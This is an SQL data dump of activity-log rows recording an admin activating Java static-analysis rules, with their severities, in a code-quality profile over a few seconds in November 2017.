INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2702, '2017-11-20 12:19:07.657', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXikJbbGRdfPp-rHy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2703, '2017-11-20 12:19:07.683', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXikjbbGRdfPp-rHz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2704, '2017-11-20 12:19:07.703', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXik3bbGRdfPp-rH0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2705, '2017-11-20 12:19:07.73', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXilSbbGRdfPp-rH1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2706, '2017-11-20 12:19:07.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXilubbGRdfPp-rH2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2707, '2017-11-20 12:19:07.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXimLbbGRdfPp-rH3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2708, '2017-11-20 12:19:07.823', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXimvbbGRdfPp-rH4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2709, '2017-11-20 12:19:07.862', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXinWbbGRdfPp-rH5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2710, '2017-11-20 12:19:07.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXin8bbGRdfPp-rH6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2711, '2017-11-20 12:19:07.937', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiohbbGRdfPp-rH7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2712, '2017-11-20 12:19:07.98', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXipMbbGRdfPp-rH8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2713, '2017-11-20 12:19:08.016', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXipwbbGRdfPp-rH9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2714, '2017-11-20 12:19:08.057', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiqZbbGRdfPp-rH-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2715, '2017-11-20 12:19:08.105', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXirJbbGRdfPp-rH_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2716, '2017-11-20 12:19:08.148', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXir0bbGRdfPp-rIA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2717, '2017-11-20 12:19:08.187', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXisbbbGRdfPp-rIB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2718, '2017-11-20 12:19:08.223', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXis_bbGRdfPp-rIC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2719, '2017-11-20 12:19:08.249', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXitZbbGRdfPp-rID');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2720, '2017-11-20 12:19:08.285', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXit9bbGRdfPp-rIE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2721, '2017-11-20 12:19:08.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiu3bbGRdfPp-rIF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2722, '2017-11-20 12:19:08.394', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXivqbbGRdfPp-rIG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2723, '2017-11-20 12:19:08.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiwcbbGRdfPp-rIH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2724, '2017-11-20 12:19:08.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXix6bbGRdfPp-rII');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2725, '2017-11-20 12:19:08.599', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiy3bbGRdfPp-rIJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2726, '2017-11-20 12:19:08.69', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi0SbbGRdfPp-rIK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2727, '2017-11-20 12:19:08.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi1zbbGRdfPp-rIL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2728, '2017-11-20 12:19:08.876', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi3MbbGRdfPp-rIM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2729, '2017-11-20 12:19:08.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi3kbbGRdfPp-rIN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2730, '2017-11-20 12:19:08.938', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi4KbbGRdfPp-rIO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2731, '2017-11-20 12:19:08.974', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi4ubbGRdfPp-rIP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2732, '2017-11-20 12:19:09.011', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi5TbbGRdfPp-rIQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2733, '2017-11-20 12:19:09.047', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi53bbGRdfPp-rIR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2734, '2017-11-20 12:19:09.078', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi6WbbGRdfPp-rIS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2735, '2017-11-20 12:19:09.12', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi7AbbGRdfPp-rIT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2736, '2017-11-20 12:19:09.156', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi7kbbGRdfPp-rIU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2737, '2017-11-20 12:19:09.192', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi8IbbGRdfPp-rIV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2738, '2017-11-20 12:19:09.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi8rbbGRdfPp-rIW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2739, '2017-11-20 12:19:09.264', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi9QbbGRdfPp-rIX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2740, '2017-11-20 12:19:09.304', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi94bbGRdfPp-rIY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2741, '2017-11-20 12:19:09.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi-jbbGRdfPp-rIZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2742, '2017-11-20 12:19:09.391', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXi_PbbGRdfPp-rIa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2743, '2017-11-20 12:19:09.442', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjACbbGRdfPp-rIb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2744, '2017-11-20 12:19:09.498', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjA6bbGRdfPp-rIc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2745, '2017-11-20 12:19:09.619', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjCzbbGRdfPp-rId');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2746, '2017-11-20 12:19:09.692', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjD8bbGRdfPp-rIe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2747, '2017-11-20 12:19:09.738', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjEqbbGRdfPp-rIf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2748, '2017-11-20 12:19:09.774', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjFObbGRdfPp-rIg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2749, '2017-11-20 12:19:09.812', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjF0bbGRdfPp-rIh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2750, '2017-11-20 12:19:09.848', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjGYbbGRdfPp-rIi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2751, '2017-11-20 12:19:09.891', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjHDbbGRdfPp-rIj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2752, '2017-11-20 12:19:09.929', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjHpbbGRdfPp-rIk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2753, '2017-11-20 12:19:09.956', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjIEbbGRdfPp-rIl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2754, '2017-11-20 12:19:09.996', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjIsbbGRdfPp-rIm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2755, '2017-11-20 12:19:10.027', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjJLbbGRdfPp-rIn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2756, '2017-11-20 12:19:10.064', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjJwbbGRdfPp-rIo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2757, '2017-11-20 12:19:10.117', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjKlbbGRdfPp-rIp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2758, '2017-11-20 12:19:10.159', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjLPbbGRdfPp-rIq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2759, '2017-11-20 12:19:10.199', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjL3bbGRdfPp-rIr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2760, '2017-11-20 12:19:10.24', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjMgbbGRdfPp-rIs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2761, '2017-11-20 12:19:10.266', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjM6bbGRdfPp-rIt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2762, '2017-11-20 12:19:10.303', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjNfbbGRdfPp-rIu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2763, '2017-11-20 12:19:10.345', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjOJbbGRdfPp-rIv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2764, '2017-11-20 12:19:10.418', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjPSbbGRdfPp-rIw');
